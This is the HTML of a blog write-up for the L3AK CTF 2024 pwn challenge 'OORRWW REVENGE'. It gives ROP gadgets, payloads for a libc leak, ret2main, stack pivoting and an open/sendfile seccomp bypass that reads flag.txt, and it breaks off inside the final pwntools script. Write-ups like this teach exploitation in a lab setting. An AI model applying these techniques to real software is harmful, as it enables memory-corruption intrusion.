@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>L3AK CTF 2024 - OORRWW REVENGE | F0ndueSav0yarde</title>
+<meta name="title" content="L3AK CTF 2024 - OORRWW REVENGE" />
+<meta name="description" content="OORRWW REVENGE" />
+<meta name="author" content="" />
+<meta name="keywords" content="" />
+
+
+
+
+
+
+  
+  <meta property="og:url" content="https://f0nduesav0yarde.github.io/blog/writeups/l3akctf_2024_oorrww_revenge/">
+  <meta property="og:site_name" content="F0ndueSav0yarde">
+  <meta property="og:title" content="L3AK CTF 2024 - OORRWW REVENGE">
+  <meta property="og:description" content="OORRWW REVENGE">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2024-01-14T07:07:07+01:00">
+    <meta property="article:modified_time" content="2024-01-14T07:07:07+01:00">
+
+
+  
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="L3AK CTF 2024 - OORRWW REVENGE">
+  <meta name="twitter:description" content="OORRWW REVENGE">
+
+
+  
+  
+  <meta itemprop="name" content="L3AK CTF 2024 - OORRWW REVENGE">
+  <meta itemprop="description" content="OORRWW REVENGE">
+  <meta itemprop="datePublished" content="2024-01-14T07:07:07+01:00">
+  <meta itemprop="dateModified" content="2024-01-14T07:07:07+01:00">
+  <meta itemprop="wordCount" content="1268">
+
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  
+  <link href="/original.min.css" rel="stylesheet">
+
+  
+    
+    <link href="/syntax.min.css" rel="stylesheet">
+  
+
+  
+
+  
+</head>
+
+<body>
+  <header><a class="skip-link" href="#main-content">Skip to main content</a>
+
+<a href="/" class="title"><h1>F0ndueSav0yarde</h1></a>
+<nav>
+
+
+
+
+
+
+
+</nav>
+</header>
+  <main id="main-content">
+
+<h1>L3AK CTF 2024 - OORRWW REVENGE</h1>
+
+
+<content>
+  <p><strong>Category : PWN</strong></p>
+<h2 id="phreaks-2600">Phreaks 2600</h2>
+<p>You can find this writeup at <a href="https://phreaks2600.fr/blog/l3ak-2025-oorrww-revenge/">Phreaks 2600 website</a></p>
+<h2 id="oorrww-revenge--oorrww">OORRWW Revenge != OORRWW</h2>
+<p>Although the challenges are similar, here are their differences :</p>
+<ul>
+<li>No more leaks of stack address or LIBC function :</li>
+</ul>
+<p><img src="/images/writeups/l3akctf_2024_oorrww_revenge/gift.png" alt="gift"></p>
+<ul>
+<li>The payload will be longer (its size increased from 22 bytes to <strong>30 bytes</strong>)</li>
+</ul>
+<p><img src="/images/writeups/l3akctf_2024_oorrww_revenge/loop.png" alt="loop"></p>
+<ul>
+<li><strong>PIE</strong> is <strong>OFF</strong>. I will again assume that ASLR is <strong>ON</strong> :</li>
+</ul>
+<p><img src="/images/writeups/l3akctf_2024_oorrww_revenge/checksec.png" alt="checksec"></p>
+<h2 id="leak-__isoc99_scanf-manually">Leak __isoc99_scanf manually</h2>
+<p>According to <strong>OORRWW</strong>, I know where the vulnerability is and I know what to do.<br>
+However, there are no more leaks. I need to do <strong>ret2libc</strong> by leaking a function address myself.<br>
+Why not using <code>puts()</code> to leak <code>__isoc99_scanf()@GOT</code> again ?</p>
+
+
+
+
+
+<pre tabindex="0"><code>0x0000000000401203 : pop rax ; ret
+0x00000000004012db : mov edi, eax ; call 0x4010c0 ; nop ; pop rbp ; ret</code></pre><p>These two gadgets are perfect since <code>0x4010c0</code> points to <code>puts@plt</code>.</p>
+<p><img src="/images/writeups/l3akctf_2024_oorrww_revenge/gdb1.png" alt="gdb1"></p>
+<blockquote>
+<p>As you can see in this pwndbg session <code>__isoc99_scanf@PLT</code> address is <code>0x401100</code> which is less than 4-bytes long. It will fit in a 4 bytes register (EAX and EDI)</p>
+</blockquote>
+<p>I used this payload for leaking data (using functions from <strong>OORRWW</strong> payload):</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="mi">1</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="c1"># canary</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="c1"># rbp</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">           <span class="n">int2bytes</span><span class="p">(</span><span class="n">POP_RAX_RET</span><span class="p">),</span> <span class="c1"># ret</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">           <span class="n">int2bytes</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&#34;__isoc99_scanf&#34;</span><span class="p">]),</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">           <span class="n">int2bytes</span><span class="p">(</span><span class="n">MOV_EDI_EAX_PUTS</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span> <span class="p">]</span></span></span></code></pre></div><h2 id="ret2main">Ret2Main</h2>
+<p>There are no stack address leak as the first challenge… And I have 40 bytes left for my payload, which is not enough.</p>
+<p>Let’s do <strong>ret2main</strong> to start again with LIBC leak :</p>
+<p><img src="/images/writeups/l3akctf_2024_oorrww_revenge/not_aligned.png" alt="not_aligned"></p>
+<p>Oops, <strong>SIGSEGV</strong> !<br>
+I need to be careful to stack alignment issues. Here is the new payload :</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="mi">1</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="c1"># canary</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="c1"># rbp</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">           <span class="n">int2bytes</span><span class="p">(</span><span class="n">POP_RAX_RET</span><span class="p">),</span> <span class="c1"># ret</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">           <span class="n">int2bytes</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&#34;__isoc99_scanf&#34;</span><span class="p">]),</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">           <span class="n">int2bytes</span><span class="p">(</span><span class="n">MOV_EDI_EAX_PUTS</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="c1"># pop rbp from previous gadget</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl">           <span class="n">int2bytes</span><span class="p">(</span><span class="n">RET</span><span class="p">),</span> <span class="c1"># align the stack to 16 bytes</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl">           <span class="n">int2bytes</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;main&#34;</span><span class="p">]),</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="ln">30</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="ln">31</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span> <span class="p">]</span></span></span></code></pre></div><h2 id="second-round--writing-payload-in-stdin">Second round : writing payload in STDIN</h2>
+<p>Because I have no leak of stack address and no more space (56 bytes are not enough), my idea was to continue writing somewhere using more bytes.<br>
+Because <strong>PIE</strong> is off, I know where is data segment and I can continue writing my payload inside. I have LIBC leak so I can use this function :</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="ln">1</span><span class="cl"><span class="mi">1</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x404020</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">);</span> <span class="c1">// 0x500 bytes should be enough
+</span></span></span></code></pre></div><p>Here are the gadgets found in <strong>libc.so.6</strong> :</p>
+
+
+
+
+
+<pre tabindex="0"><code>0x00000000001741a2 : pop rdi ; ret
+0x0000000000164bbb : pop rsi ; ret
+0x0000000000174e4e : pop rdx ; pop rbx ; ret</code></pre><p>And the second payload to allow injecting bytes into data segment :</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="mi">1</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">           <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="c1"># canary</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">           <span class="n">int2bytes</span><span class="p">(</span><span class="mh">0x404028</span><span class="p">),</span> <span class="c1"># rbp -&gt; stack pivoting (RSP = 0x404030)</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">           <span class="n">int2bytes</span><span class="p">(</span><span class="n">POP_RDI_RET</span><span class="p">),</span> <span class="c1"># ret</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">           <span class="n">int2bytes</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">           <span class="n">int2bytes</span><span class="p">(</span><span class="n">POP_RSI_RET</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">           <span class="n">int2bytes</span><span class="p">(</span><span class="mh">0x404020</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl">           <span class="n">int2bytes</span><span class="p">(</span><span class="n">POP_RDX_RBX_RET</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl">           <span class="n">int2bytes</span><span class="p">(</span><span class="mh">0x500</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl">           <span class="n">int2bytes</span><span class="p">(</span><span class="mh">0x500</span><span class="p">),</span> 
+</span></span><span class="line"><span class="ln">30</span><span class="cl">           <span class="n">int2bytes</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;read&#34;</span><span class="p">]),</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl">           <span class="n">int2bytes</span><span class="p">(</span><span class="n">LEAVE_RET</span><span class="p">),</span> <span class="c1"># stack pivoting (rsp = rbp -&gt; 0x404030)</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="p">]</span></span></span></code></pre></div><p>Now, I can write <strong>1280 bytes</strong> of data in <code>0x404020</code> and redirect <strong>RSP</strong> at <code>0x404030</code> using stack pivoting technique.</p>
+<blockquote>
+<p>Thanks to stack pivoting, <strong>RSP</strong> is now pointing to data segment !<br>
+I let 16 bytes between <strong>RSP</strong> and <strong>RBP</strong> to write <code>“flag.txt\0”</code>.<br>
+I no longer use <code>scanf(&quot;%lf&quot;,...);</code> : I can write raw bytes instead of double floating points.</p>
+</blockquote>
+<h2 id="third-round--seccomp-bypass">Third round : seccomp bypass</h2>
+<p>Then, all I need to do is to bypass seccomp with <code>open</code> and <code>sendfile</code>. The last payload is quite the same as <strong>OORRWW</strong> :</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="mi">1</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="c1"># &#34;flag.txt&#34;</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">                <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="c1"># &#34;\0&#34; for the end of &#34;flag.txt&#34;</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">      <span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX_RET</span><span class="p">),</span> <span class="c1"># RAX = 2</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">                <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">      <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI_RET</span><span class="p">),</span> <span class="c1"># RDI = buffer -&gt; &amp;&#34;flag.txt\0&#34; </span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">         <span class="n">p64</span><span class="p">(</span><span class="mh">0x404020</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">      <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_RET</span><span class="p">),</span> <span class="c1"># RSI = O_RDONLY -&gt; 2</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">                <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">      <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL_RET</span><span class="p">),</span> <span class="c1"># open(&#34;flag.txt\0&#34;,O_RDONLY);</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">      <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI_RET</span><span class="p">),</span> <span class="c1"># RDI = 1 -&gt; stdout </span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">                <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">      <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_RET</span><span class="p">),</span> <span class="c1"># RSI = 3 (I assume it is the file descriptor of opened file)</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">                <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span> 
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDX_POP_RBX_RET</span><span class="p">),</span> <span class="c1"># RDX = 0 -&gt; offset</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">                          <span class="c1"># RBX = 0 (junk)</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">                <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> 
+</span></span><span class="line"><span class="ln">18</span><span class="cl">                <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> 
+</span></span><span class="line"><span class="ln">19</span><span class="cl">      <span class="n">p64</span><span class="p">(</span><span class="n">POP_RCX_RET</span><span class="p">),</span> <span class="c1"># RCX = 0x50 </span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">             <span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;sendfile&#34;</span><span class="p">]),</span> <span class="c1"># sendfile(1,3,0,0x50);</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">]</span></span></span></code></pre></div><h2 id="final-payload">Final payload</h2>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">  1</span><span class="cl"><span class="mi">1</span>
+</span></span><span class="line"><span class="ln">  2</span><span class="cl"><span class="c1"># ===============================================[ Module Imports ]===============================================</span>
+</span></span><span class="line"><span class="ln">  3</span><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="ln">  4</span><span class="cl"><span class="kn">from</span> <span class="nn">decimal</span> <span class="kn">import</span> <span class="n">Decimal</span>
+</span></span><span class="line"><span class="ln">  5</span><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="ln">  6</span><span class="cl">
+</span></span><span class="line"><span class="ln">  7</span><span class="cl"><span class="c1"># =====================================[ Load ELF binary and start process ]======================================</span>
+</span></span><span class="line"><span class="ln">  8</span><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./oorrww_revenge_patched&#34;</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">  9</span><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;libc.so.6&#34;</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 10</span><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">],</span><span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;LD_PRELOAD&#34;</span><span class="p">:</span> <span class="n">libc</span><span class="o">.</span><span class="n">path</span><span class="p">})</span>
+</span></span><span class="line"><span class="ln"> 11</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 12</span><span class="cl"><span class="c1"># ==================================================[ Functions ]=================================================</span>
+</span></span><span class="line"><span class="ln"> 13</span><span class="cl"><span class="k">def</span> <span class="nf">int2double</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln"> 14</span><span class="cl">    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;d&#39;</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">x</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="ln"> 15</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 16</span><span class="cl"><span class="k">def</span> <span class="nf">double2bytes</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln"> 17</span><span class="cl">    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 18</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 19</span><span class="cl"><span class="k">def</span> <span class="nf">int2bytes</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln"> 20</span><span class="cl">    <span class="k">return</span> <span class="n">double2bytes</span><span class="p">(</span><span class="n">int2double</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
+</span></span><span class="line"><span class="ln"> 21</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 22</span><span class="cl"><span class="k">def</span> <span class="nf">bytes2doublebytes</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln"> 23</span><span class="cl">    <span class="k">return</span> <span class="n">double2bytes</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;d&#39;</span><span class="p">,</span><span class="n">x</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln"> 24</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 25</span><span class="cl"><span class="c1"># ========================================[ oorrww_revenge_patched Gadgets ]======================================</span>
+</span></span><span class="line"><span class="ln"> 26</span><span class="cl"><span class="n">MOV_EDI_EAX_PUTS</span> <span class="o">=</span> <span class="mh">0x00000000004012db</span>
+</span></span><span class="line"><span class="ln"> 27</span><span class="cl"><span class="n">POP_RAX_RET</span> <span class="o">=</span> <span class="mh">0x0000000000401203</span>
+</span></span><span class="line"><span class="ln"> 28</span><span class="cl"><span class="n">RET</span> <span class="o">=</span> <span class="mh">0x000000000040101a</span>
+</span></span><span class="line"><span class="ln"> 29</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 30</span><span class="cl"><span class="c1"># ==========================================[ First payload : leak LIBC ]=========================================</span>
+</span></span><span class="line"><span class="ln"> 31</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 32</span><span class="cl">            <span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span>
